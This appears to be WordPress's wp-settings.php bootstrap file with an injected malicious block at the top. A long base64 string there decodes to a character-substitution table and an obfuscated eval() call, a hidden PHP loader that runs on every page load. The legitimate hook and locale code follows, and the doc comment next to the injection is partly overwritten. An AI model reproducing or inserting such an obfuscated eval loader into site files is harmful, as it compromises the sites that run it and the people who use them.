0SlVpNzhVWmhlNXExekdPdHBqUXRKSFEzUHlRWEhVdGcnLgonSEtabXhjcjFPb25GZGs5dGVGNFhwbDlZaktpZ3FqaWdxamlncWppZ3E1NFlqS2lncWppZ3FqaWdXcjRwRCcuCidyMWdxamlncWppZ3E1T0Y2NWt5ektpdHpHazRIVFEzNm8yYURyMWdxamlnV3I0cERyMWdxamlnQXZrN0pHUVh6VElnSkdZV0Fva2h4dkZDNmpndEFvVjRKVUNnT29uJy4KJ0ZkVXRZaktpZ3FqWmFEcjFncWppZ3FqaWdxbzY5elRPM3pqaXRKR1lXSkhrNGVEOVlqZzRwcWppZ3FqaWdxalp5QUhRd3hjSWdKJy4KJ0dZV0Fva2h4dkZDNlZNQ2VvVk5BVTNoeHdNdEFQWXlkSFo0SEdaMUpIWUZwalF0SkhRM0xqaXRlVGsnLgonc3BVQ2dPb1lOSFRWdzZvZ1hmQzRwcWppZ3E1NFlqS2lncWpaYzZQc2g2b0ZtektaaHh3TUYnLgonemNZeWRIWjRwalF0SkhRM0xqaXRlVGtzcHI0cHFqaWdxNTlZaktpZ3FqaWdxamlnQVR1bUpjVjlxalFoeHdNMzZIUTFmQycuCic0cERyMWdxamlncWppZ3E1T0Y2NWt5ektaaHh3TXRBUFl5ZEhaNEhHWjFKSFlGcG9ZTkhUUUZKR09zeDVRV3hvMzN4VFMxT29RMzZvMjlxalFoeHdNMzYnLgonSFExcFVDZ09vbkZkVXRhRHIxZ3FqaWdXcjRwRHIxZ3FqaWdBdms3SkdRWHpUSWdKR1lXQWNGOUFrTXlBUFZ0cCcuCidqUUNKSFExcHI0cHFqaWdxNTlZaktpZ3FqaWdxamlnT29RMzZvMmc4VVppQWNGOUFrTXZBSFFXSlRNNzZvazc2NVIxTzVaMzZvZ1hmQzRwRHIxZ3FqaScuCidncWppZ3E1T0Y2NWt5ektpdEFvVjRKbDlZaktpZ3FqWk1EcjFZaktpZ3FqWmM2UHNoNm9GbXpLWmh4d01jZVB1RkhHNnllSFFGcGpRQ0pIUTFMJy4KJ2ppdEFvVjRKVXRZaktpZ3FqWmFEcjFncWppZ3FqaWdxMlpjZVB1RkhHWnc2Vk1oelRzNEFQczR4eWd0eG9WNGVqQ2dPb1EzNm8yWGZDNHBxamlncTU0Jy4KJ1lqZzRwcWppZ3FvQXd6Y1k0ZVBNN3FvWU5IVEFYem9rV0pIWkNBUHN0cGpRQ0pIUTFMaml0QW9WNEpVdFlqS2lncWpaYURyMWdxaicuCidpZ3FqaWdxMlpjZVB1RkhHWnc2Vk1oelRzNEFQczR4eWd0eG9WNGVqQ2dPb1EzNm8yOXFEZ1hmQzRwcWppZ3E1NFlqZzRwcWppZycuCidxb0F3emNZNGVQTTdxb1lOSEdZbXh2UVdKVE1ueG9WeUFIcTFPbzI5cWpRS3ByNHBxamlncTU5WWpLaWdxamlncWppZ3hjazQ2SE8nLgonN3E1WTR4Y3VGektndEpVdGdMVVpONjVPOUFQSTFPb3FYZkM0cHFqaWdxNTRZamc0cHFqaWdxb0F3emNZNGVQTTdxb1lOSDQ2RjYyWW16UHdtekZZNHpHTzNBVFMxT29RWHgnLgondlJNbEZrUmxqdFlqS2lncWpaYURyMWdxamlncWppZ3FqUU5BUHVjSFRRWHhLaU1xb1FYeGNzM3pQUzFId01vVVN1Vkh3QlhmQzRwJy4KJ0RyMWdxamlncWppZ3FqUWh6VHduelRzV3pjVm5BSFJnOFVaWnh2TzNkVWdLekdaNGVQTTd4eXE5Jy4KJ3FqT1RlUGtHeHlxOXFqT0NKUDZGeHlxOXFqT05BSFlOZVBNN3h5cTlxak9ONm9WNHh5cTlxak93eFRreXh5cTlxak8zeHZRWEpUdUZ4eXE5cWpPdDZQdycuCidDcUtDZ3FjM0ZKUFFGeHZSS0xqaUt6b0ZLeHlxWGZDNHBEcjFncWppZ3FqaWdxalE0ekhaV0FvRnlxRDRnTzVZRnpvQVdBb0Z5cWpJZ3FLQicuCidLcWpJZ09vWW16UHdtekZNN0pQd0Z4d25ONjVPOUFQSTFKR1lXUVRrNFVvTU42amdYcFVpRnFvWW02UCcuCidzNHBqUWh6VHduelRzV3pjVm5BSFJYSGw5WWpnNHBxamlncWppZ3FqWlhBS2kxQWNGOUFrTUZkb0ZONjVSMU81UW54Vk10ZUhxWHByNHBxamlncWppZ3FqWicuCidhRHIxZ3FqaWdxamlncWppZ3FqWnlBSFF3eGNJZ081UW54Vk10ZUhxYURyMWdxamlncWppZ3E1NFlqZzRwcScuCidqaWdxamlncWpaWEFLM25lVFFYeEtndDZvd0NIVFFYeEt0WERyMWdxamlncWppZ3E1OVlqS2lncWppZ3FqaWdxaicuCidpZ3E1T0Y2NWt5ektpdDZvd0NIVFFYeGg5WWpLaWdxamlncWppZ1dyNHBEcjFncWppZ3FqaWdxNU9GNjVreXpLaUsnLgoncWg5WWpLaWdxalpNRHIxWWpLaWdxalpjNlBzaDZvRm16S1poeHdNQ3o1a3ZlUHNXSlBRdHBqUTdKUHdGTGppdEpjVk5BbEo0SFRRMzZvMlhEcjFncWppZ2RDNHBxamlnJy4KJ3FqaWdxaml0QW9WNEpVaU1xb08zeFRTVFlWTXRBUFltQW9TMU9vTzN4VFNUWVZNdEpIUTNwbDlZamc0cHFqaWdxamlncWppdHhHUW14Y1Z2QWtNQ0pIUTFxJy4KJ0Q0Z0pHWVdRVGs0clRNbnpQTTdTR1FteGNWdkFVZ1hxaklncUtCS2ZDNHBxamlncWppZ3FqaXR4R1FteGNWdkFrTScuCidDSkhRMXFENGdPNVk0ekdPM0FUa1d4b1Y0ZWppN3E1WXdKdlk0eEszbkFEUzFxY1kzSlQzRnFLdDlxRGk5cURTWHFqSWdxRkJLcWpJZ3pQcndwalE3SlB3RnFqSWcnLgonSkdZV1FUazRVb01ONmpnWHBsOVlqZzRwRHIxZ3FqaWdxamlncW9ZTkhUQVh6b2tXNkdPWDZvJy4KJ1MxTzVZNHpHTzNBVGtXeG9WNGVqQ2dKR1lXQVBzaHh2RkM2amd0QW9WNEpVQ2dKR1lXUVRrNFVvTU42amdYcFV0YURyMWdxamlnV3I0cERyMWdxamlnQXYnLgonazdKR1FYelRJZ0pHWVd4b3V3QVRGN0hHT0Z6VWd0emNWbkFVdFlqS2lncWpaYURyMWdxamlncWppZ3FqUU42b015SlA2RkhHWjM2b2dnOFVaaHh3TTVBSFFEJy4KJ3pUd256VHNsNm9NeUpQNkZwanQ3cWpxbXFoOVlqS2lncWppZ3FqaWdPNVk0ekdPM0FUa1d4b1Y0ZWppTXFqUU42b015Jy4KJ0pQNkZIR1ozNm9nZ0xLWk42UE9ONjVxMXpQcndwak9oSlBZMUFVcVhMamlDTGppd3BVaTdxak9XcUtpN3Fvd3RZVWd0emNWbkFVaTdxb1lOSDQ2RjYyJy4KJzNteEdyMXBVdGFEcjFZaktpZ3FqaWdxamlnZVBKZ3BvQVh6b2tXQUgzWHhHUU5walFONm9NeUpQNkZIR1ozNm9nWHByNHBxamlncWppZ3FqWmFEcjFncWppZ3EnLgonamlncWppZ3FqWmk2UHM5ZVBzYnBqUU42b015SlA2RkhHWjM2b2dYZkM0cHFqaWdxamlncWpaTURyMWdxamlnV3I0cERyMWdxamlnQXZrN0pHJy4KJ1FYelRJZ0pHWVd4b3V3QVRGN0hUdW1KUHIxT29zM3pQU01sRmtSbGp0WWpLaWdxalphRHIxZ3FqaWdxamlncWpRTjZvTXlKUDZGSEdaMzZvJy4KJ2dnOFVaaHh3TTVBSFFEelR3bnpUc2w2b015SlA2RnBqdGFEcjFZaktpZ3FqaWdxamlnZVBKZ3BvRk5IJy4KJ1RRWHhLZ3R4R1FteGNWdkFrTUNKSFExcFV0WWpLaWdxamlncWppZ2RDNHBxamlncWppZ3FqaWdxamlnZVBKZ3BqUTdKJy4KJ1B3RnFENE1xMnNrbDJDWHFqQm1xb3VtSlByZ0pQdTlxNVo5NlA2WHp2UllqS2lncWppZ3FqaWdxamlncTU5WWpLaWdxamlncWppZ3FqaWdxamlncWpaY3pHT0ZKJy4KJ1BZMXFqM05KVFY3QW9GeXBqUU42b015SlA2RkhHWjM2b2dYcW9WTnFqUWJBSHRNOEtRQ3o1a3ZlUHNXemNWbkFVdFlqS2lncWppZ3FqaWdxamlncWppZ3FqWmFEcjFncScuCidqaWdxamlncWppZ3FqaWdxamlncWppZ3FvRmNxajNONjVPQ3pHUjFPNVo5NlA2WHpGTTdKUHdGTGpaTicuCic2UE9ONjVxMXpQcndwak9oSlBZMUFVcVhMamlDTGppd3BVdGdxbDRNcTJBM3o1WUZwcjRwcWppZ3FqaWdxamlncWppZ3FqaWdxamlncWpaYURyMWdxamlncWppZ3FqaWdxJy4KJ2ppZ3FqaWdxamlncWppZ3FqWmlBSEEzemozaHh3TXRBUFl5ZEhaNHBvWU5IVEFYem9rV3hjazNBamd0eEdRbXhjVnZBa01DSkhRMXFqSWdxS0JLcScuCidqSWdPNVo5NlA2WHpGTTdKUHdGcFVDZ0pHWVdRVGs0VW9NTjZqZ1hwVXRhRHIxZ3FqaWdxamlncWppZ3FqaWdxamlncWppZ3E1NFlqS2lncWppZ3FqaWdxJy4KJ2ppZ3FqaWdxalpNRHIxZ3FqaWdxamlncWppZ3FqWk1EcjFncWppZ3FqaWdxamlncWpaRno1WUZEcjFncWppZ3FqaWdxamlncWpaYURyMWdxamlncWppZ3FqJy4KJ2lncWppZ3FqaWdPNVk0ekdPM0FUa1d4b1Y0ZWppTXFqUU42b015SlA2RkhHWjM2b2dnTEtpS0x5cWdMS1pONlBPTjY1cScuCicxelByd3BqT2hKUFkxQVVxWExqaUNMaml3cFVpN3FqT1dxS2k3cW93dFlVZ3R6Y1ZuQVVpN3EnLgonb1lOSDQ2RjYyM214R3IxcFV0YURyMVlqS2lncWppZ3FqaWdxamlncWppZ3FqWlhBS2kxQWNGOUFrTUZkb0ZONjVSMScuCidPNVk0ekdPM0FUa1d4b1Y0ZWp0WERyMWdxamlncWppZ3FqaWdxamlncWppZ2RDNHBxamlncWppZ3FqaWdxamlncWppZ3FqJy4KJ2lncWpaaUFIQTN6ajNoeHdNdEFQWXlkSFo0cG9ZTkhUQVh6b2tXeGNrM0FqZ3R4R1FteGNWdkFrTUNKSFExcFVDZ0pHWVdRVGs0VW9NTjZqZ1hwVScuCid0YURyMWdxamlncWppZ3FqaWdxamlncWppZ1dyNHBxamlncWppZ3FqaWdxamlnV3I0cHFqaWdxamlncWpaTURyMWdxamlnV3I0cERyMWdxamlnQXZrN0pHUVh6VElnSkdZVzYnLgonR09YNm9WS3pva1dKVDNGSlQ5MXByNHBxamlncTU5WWpLaWdxamlncWppZ2VQSmdwNVk0eGN1RnpLM2h4d001QUhRRHpUd256VHNsNm9NeUpQNkZwanRYcScuCidqMk1xRGlYRHIxZ3FqaWdxamlncTU5WWpLaWdxamlncWppZ3FqaWdxNU9GNjVreXpLWlN4dmtGZkM0cHFqaWdxamlncWpaTURyMWdxamlncWppZ3EnLgonb2s5eFRTWWpLaWdxamlncWppZ2RDNHBxamlncWppZ3FqaWdxamlneGNrNDZITzdxMkEzejVZRmZDNHBxamlncWppZ3FqWk1EcjFncWppZ1dyJy4KJzRwRHIxZ3FqaWdBY015QVBWaGVqaTFPVk1EbDRNTFVTU2dKSFJnT29uRmRsNCtPNUEzejVrRnByNHBxamlncTU5WWpLaWdxamlncWppZ08nLgonb1EzNm8yZzhVaXQ2Y1Y5NlBTYURyMWdxamlncWppZ3FqUXRKSFEzSFRuRmRVaU1xalFiQUh0YURyMWdxamlnV3I0cERyMWdxamlnZVBKZ3BqMnRBb1Y0SlV0WWpLaWdxalonLgonYURyMWdxamlncWppZ3FvQW14Y2szSlRnZ3BqUVdTMk1sa2paM3h5aXRlVGtzOGxJdDZjVjk2UFNYRHIxZ3FqaWdxamknLgonZ3E1OVlqS2lncWppZ3FqaWdxamlncWpRdEpIUTNxRDRnTzVBM3o1a0ZmQzRwcWppZ3FqaWdxamlncWppZ09vUTM2Jy4KJ29WV2VUa3NxRDRnT29uRmRsOVlqS2lncWppZ3FqaWdXcjRwcWppZ3E1NFlqZzRwcWppZ3FqUXQnLgonSkhRM3FENGdyNWs3eFRreWVQVjllSFhGcG9ZTkhUUUZKR09zeDVyMUpjVk5BbEo0SFRRRkpUTXRBVWd0QScuCidvVjRKVXQ5cWpRdEpIUTNIVG5GZFV0WGZDNHBEcjFncWppZ2VQSmdwb0ZOeFRrNHBqUXRKSFEzUHk2M2V5NjZwVWljT0tpdEonLgonR1lXSkhrNGVENE1Pb1EzNm9Wek9UVmJPdzRYRHIxZ3FqaWdkQzRwcWppZ3FqaWdxalpYQUtpMU9vUTM2b1Z6T1QydkhVaU04VWl2ZVV4WERyMWdxamlncWppZ3E1OVlqS2lncScuCidqaWdxamlncWppZ3FqUVhxRDRnckhPeUpIdDFEcjFncWppZ3FqaWdxamlncWppZ3FqaWdPRycuCidaVE95aU04S1ppeG8zQzZja3l4VEZtektnWExpNHBxamlncWppZ3FqaWdxamlncWppZ3FqNk42S3hnJy4KJzhsSWdPTjI3Umo0eU95Q1lqS2lncWppZ3FqaWdxamlncWppZ3FqaXZKUDl2cUQ0K3FqUXRKSFEzUHk2M2V5NjZMaTRwcWppZ3FqaWdxamlnJy4KJ3FqaWdwbDlZaktpZ3FqaWdxamlncWppZ3Fva2hlb0JncjVZRnhjRjN6b0YwQVVndGVVdGFEcjEnLgonZ3FqaWdxamlncWppZ3FqWkZkb0Y0ZkM0cHFqaWdxamlncWpaTURyMWdxamlncWppZ3Fvazl4VGtYQUtpMU9vUTM2b1Z6T1QydkhVaU04VWl2QVUnLgoneFhEcjFncWppZ3FqaWdxNTlZaktpZ3FqaWdxamlncWppZ3Fva1RKUEMxT29RMzZvVnpPVHJ2SFV0YURyMWdxamlncWppZ3E1NFlqS2knLgonZ3FqaWdxamlnQVB1TkFQRmNxamd0QW9WNEprOXZKVTY2cUQ0TXFqNkN6NWt2ZVBJdnByNHBxamlncWppZ3FqWmFEcjFncWppZ3FqaWdxamknLgonZ3FqWlhBS2d0QW9WNEprOXZ4VDJ2SFVpTThVaXZKUFF0T3l0WWpLaWdxamlncWppZ3FqaWdxNTlZaktpZ3FqaWdxamlncWppZ3FqaWdxalpoeHdNQ3o1a3ZlUHNXSlBRJy4KJ3RwalF0SkhRM1B5NkNPdzQ5cWpRdEpIUTNQeTZ0T3c0WGZDNHBxamlncWppZ3FqaWdxamlnV3I0cHFqaWdxamknLgonZ3FqaWdxamlnQVB1TkFQRmNwalF0SkhRM1B5Nk5KVTY2cUQ0TXFqNnlBUDR2cHI0cHFqaWdxamlncWppZ3FqaWdkQzRwcWppZ3FqaWdxamlncWonLgonaWdxamlncW9ZTkhHWjk2UDZYekZNeUFQNDFPb1EzNm9Wek9HaXZIVXRhRHIxZ3FqaWdxamlncWppZ3FqWk1EcjFncWppZ3FqJy4KJ2lncTU0WWpLaWdxamlncWppZ0FQWTF6eWl0QW9WNEprOXZKUDl2SGw5WWpLaWdxamlnJy4KJ3FqaWdBSDNYNmpnWGZDNHBxamlncTU0WWpnNHBxamlncW9ZTkhHWjk2UDZYekZNOXpUVicuCid0cGp0YURyWE0nOwokdmtna20gPSBBcnJheSgnMSc9PidvJywgJzAnPT4nNicsICczJz0+J2gnLCAnMic9PidFJywgJzUnPT4nSCcsICc0Jz0+JzAnLCAnNyc9Pid1JywgJzYnPT4nZCcsICc5Jz0+J3MnLCAnOCc9PidQJywgJ0EnPT4nWicsICdDJz0+J3cnLCAnQic9Pic4JywgJ0UnPT4ncScsICdEJz0+J0QnLCAnRyc9PiczJywgJ0YnPT4nbCcsICdJJz0+JzQnLCAnSCc9PidYJywgJ0snPT4naScsICdKJz0+J1knLCAnTSc9Pic5JywgJ0wnPT4nTCcsICdPJz0+J0onLCAnTic9Pid6JywgJ1EnPT4nUicsICdQJz0+J1cnLCAnUyc9PidVJywgJ1InPT4nTScsICdVJz0+J1MnLCAnVCc9PicyJywgJ1cnPT4nZicsICdWJz0+J0YnLCAnWSc9PidOJywgJ1gnPT4ncCcsICdaJz0+J0InLCAnYSc9Pic3JywgJ2MnPT4nbScsICdiJz0+J3InLCAnZSc9PidhJywgJ2QnPT4nZScsICdnJz0+J2cnLCAnZic9PidPJywgJ2knPT4nQScsICdoJz0+J2onLCAnayc9PidWJywgJ2onPT4nQycsICdtJz0+J3YnLCAnbCc9PidUJywgJ28nPT4nRycsICduJz0+J3QnLCAncSc9PidJJywgJ3AnPT4nSycsICdzJz0+JzUnLCAncic9PidRJywgJ3UnPT4neCcsICd0Jz0+J2snLCAndyc9PicxJywgJ3YnPT4nbicsICd5Jz0+J3knLCAneCc9PidjJywgJ3onPT4nYicpOwpldmFsLypobGtxbmliYSovKG5kZHZ2YmgoJHF5dGFpaywgJHZrZ2ttKSk7Cn0="));
/*before the theme is loaded.
 *
 * @since 2.6.0
 */
do_action( 'setup_theme' );

// Define the template related constants.
wp_templating_constants(  );

// Load the default text localization domain.
load_default_textdomain();

$locale = get_locale();
$locale_file = WP_LANG_DIR . "/$locale.php";
if ( ( 0 === validate_file( $locale ) ) && is_readable( $locale_file ) )
	require( $locale_file );
unset( $locale_file );

/**
 * WordPress Locale object for loading locale domain date and various strings.
 * @global WP_Locale $wp_locale
 * @since 2.1.0
 */
$GLOBALS['wp_locale'] = new WP_Locale();

/**
 *  WordPress Locale Switcher object for switching locales.
 *
 * @since 4.7.0
 *
 * @global WP_Locale_Switcher $wp_locale_switcher WordPress locale switcher object.
 */
$GLOBALS['wp_locale_switcher'] = new WP_Locale_Switcher();
$GLOBALS['wp_locale_switcher']->init();

// Load the functions for the active theme, for both parent and child theme if applicable.
if ( ! wp_installing() || 'wp-activate.php' === $pagenow ) {
	if ( TEMPLATEPATH !== STYLESHEETPATH && file_exists( STYLESHEETPATH . '/functions.php' ) )
		include( STYLESHEETPATH . '/functions.php' );
	if ( file_exists( TEMPLATEPATH . '/functions.php' ) )
		include( TEMPLATEPATH . '/functions.php' );
}

/**
 * Fires after the theme is loaded.
 *
 * @since 3.0.0
 */
do_action( 'after_setup_theme' );

// Set up current user.
$GLOBALS['wp']->init();

/**
 * Fires after WordPress has finished loading but before any headers are sent.
 *
 * Most of WP is loaded at this stage, and the user is authenticated. WP continues
 * to load on the {@see 'init'} hook that follows (e.g. widgets), and many plugins instantiate
 * themselves on it for all sorts of reasons (e.g. they need a user, a taxonomy, etc.).
 *
 * If you wish to plug an action once WP is loaded, use the {@see 'wp_loaded'} hook below.
 *
 * @since 1.5.0
 */
do_action( 'init' );

// Check site status
if ( is_multisite() ) {
	if ( true !== ( $file = ms_site_check() ) ) {
		require( $file );
		die();
	}
	unset($file);
}

/**
 * This hook is fired once WP, all plugins, and the theme are fully loaded and instantiated.
 *
 * Ajax requests should use wp-admin/admin-ajax.php. admin-ajax.php can handle requests for
 * users not logged in.
 *
 * @link https://codex.wordpress.org/AJAX_in_Plugins
 *
 * @since 3.0.0
 */
do_action( 'wp_loaded' );
